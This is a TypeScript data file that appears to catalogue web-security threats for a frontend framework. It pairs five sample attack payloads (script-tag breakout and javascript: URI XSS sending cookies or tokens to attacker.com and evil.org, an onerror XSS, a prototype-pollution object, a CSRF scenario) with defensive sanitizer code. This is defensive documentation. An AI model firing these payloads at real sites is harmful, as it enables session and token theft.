import { SecurityThreat } from '../types';

export const SECURITY_THREATS: SecurityThreat[] = [
  {
    id: 'THREAT-01',
    title: 'SSR Hydration Script-Tag Breakout Injection',
    category: 'SSR Serialization & XSS',
    samplePayload: `</script><script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`,
    vulnDescription: 'When server-rendering initial state via raw JSON.stringify(state) inside a <script> tag, user input containing </script> closes the HTML script parser prematurely, executing attacker-controlled JavaScript.',
    frameworkImpact: 'Affects legacy SSR setups and custom server implementations across React/Vue/Svelte without explicit unicode escaping.',
    aetherDefense: 'Mandatory Unicode Escape Serializer (@gati/ssr). Converts <, >, &, \\u2028, and \\u2029 to safe hexadecimal escape sequences (\\u003c, \\u003e, \\u0026).',
    aetherCodeSnippet: `// packages/ssr/src/serializer.ts
const ESCAPE_LOOKUP = {
  '&': '\\\\u0026',
  '>': '\\\\u003e',
  '<': '\\\\u003c',
  '\\u2028': '\\\\u2028',
  '\\u2029': '\\\\u2029',
};
export function serializeForHydration(data: unknown): string {
  return JSON.stringify(data).replace(/[&><\\u2028\\u2029]/g, m => ESCAPE_LOOKUP[m]);
}`
  },
  {
    id: 'THREAT-02',
    title: 'javascript: Pseudo-Protocol URI Execution',
    category: 'DOM Navigation & XSS',
    samplePayload: `javascript:fetch('https://evil.org/exfil?t='+localStorage.getItem('token'))`,
    vulnDescription: 'Passing untrusted URLs directly into <a href={userUrl}> or <iframe src={userUrl}> allows inline script execution when the link is clicked or the iframe loads.',
    frameworkImpact: 'Frequent vulnerability in React and Vue applications where developer forgot to sanitize link targets before rendering.',
    aetherDefense: 'Compile-Time URI Context Classifier + Runtime Whitelist Sanitizer. Blocks javascript:, vbscript:, data:text/html schemes. Only allows http:, https:, mailto:, tel:, and relative paths.',
    aetherCodeSnippet: `// packages/security/src/sanitizer.ts
const SAFE_SCHEMES = /^(https?:|mailto:|tel:|\\/|\\.\\/|\\.\\.\\/|#)/i;

export function sanitizeUri(rawUri: string): string {
  const trimmed = rawUri.trim();
  if (SAFE_SCHEMES.test(trimmed)) return trimmed;
  // Blocked scheme returns safe about:blank fallback
  return 'about:blank';
}`
  },
  {
    id: 'THREAT-03',
    title: 'Raw innerHTML / Dynamic Template Injection',
    category: 'DOM Injection & AST Bypass',
    samplePayload: `<img src="x" onerror="alert(document.domain)">`,
    vulnDescription: 'Direct assignment of un-sanitized strings to innerHTML, v-html, or dangerouslySetInnerHTML completely bypasses standard template escaping.',
    frameworkImpact: 'Top source of DOM-based XSS across all frontend frameworks.',
    aetherDefense: 'Disallows raw innerHTML in compiler output. Mandates <SafeHtml> component backed by cryptographically sealed W3C Trusted Types policy (aether#html).',
    aetherCodeSnippet: `// packages/security/src/trusted-types.ts
export function getGatiTrustedPolicy(): TrustedTypePolicy {
  if (typeof window !== 'undefined' && window.trustedTypes) {
    return window.trustedTypes.createPolicy('aether#html', {
      createHTML: (input) => sanitizeHtmlWithAst(input),
      createScript: () => { throw new SecurityError('Dynamic script creation blocked'); }
    });
  }
  return fallbackAstSanitizerPolicy;
}`
  },
  {
    id: 'THREAT-04',
    title: 'State Store Prototype Pollution',
    category: 'Memory Integrity & Logic Tampering',
    samplePayload: `{"__proto__": {"isAdmin": true, "polluted": true}}`,
    vulnDescription: 'Unsafe deep merging of untrusted JSON payloads into application state modifies Object.prototype, altering global object properties throughout the application runtime.',
    frameworkImpact: 'Common in legacy state management libraries and uncontrolled recursive object assign routines.',
    aetherDefense: 'Zero Object.prototype dependency. All internal reactive graph registries and store nodes instantiate via Object.create(null) and seal property descriptors.',
    aetherCodeSnippet: `// packages/reactivity/src/store.ts
export function createSafeStore<T extends object>(initialData: T): T {
  const safeTarget = Object.create(null);
  for (const [key, value] of Object.entries(initialData)) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
    safeTarget[key] = value;
  }
  return Object.seal(safeTarget);
}`
  },
  {
    id: 'THREAT-05',
    title: 'Cross-Site Request Forgery (CSRF) on Form Actions',
    category: 'Form Actions & Authentication',
    samplePayload: `POST /api/transfer-funds (Triggered from malicious origin evil-bank.com)`,
    vulnDescription: 'Attacker site submits a hidden form targeting a state-mutating server endpoint, leveraging the user authenticated session cookie.',
    frameworkImpact: 'Frequent issue in frameworks with server actions that do not enforce strict origin and token checks by default.',
    aetherDefense: 'Automatic Sec-Fetch-Site origin verification, double-submit CSRF cookie token injection, and build-time action HMAC signatures.',
    aetherCodeSnippet: `// packages/forms/src/action.ts
export function verifyActionRequest(req: Request, expectedActionId: string): boolean {
  const origin = req.headers.get('origin');
  const secFetchSite = req.headers.get('sec-fetch-site');
  if (secFetchSite === 'cross-site') return false;
  const token = req.headers.get('x-aether-csrf') || getCookieToken(req);
  return validateCsrfHmac(token, expectedActionId);
}`
  }
];
